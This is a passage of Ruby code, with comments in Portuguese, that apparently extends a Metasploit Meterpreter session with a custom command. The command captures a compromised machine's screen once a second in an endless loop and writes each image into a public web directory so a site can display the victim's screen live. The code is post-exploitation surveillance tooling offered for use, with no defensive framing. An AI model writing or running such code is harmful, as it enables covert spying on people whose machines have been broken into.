...
protected
  ...
  # Comando personalizado para capturar screenshots contínuas
  def cmd_screenshot_stream(*args)
    print_status("Iniciando captura de tela contínua...")

    # Diretório onde as capturas serão salvas
    screenshots_dir = "/var/www/html/screenshots"
    Dir.mkdir(screenshots_dir) unless Dir.exist?(screenshots_dir)

    # Loop para capturar e salvar as capturas de tela
    while true
      begin
        data = client.webcam.screenshot
        file_path = "#{screenshots_dir}/latest.jpg"

        # Salve a captura como 'latest.jpg' para o site exibir
        File.open(file_path, "wb") { |f| f.write(data) }
        print_status("Screenshot salva em: #{file_path}")

        sleep(1) # Intervalo entre capturas
      rescue => e
        print_error("Erro ao capturar screenshot: #{e.message}")
        break
      end
    end
  end
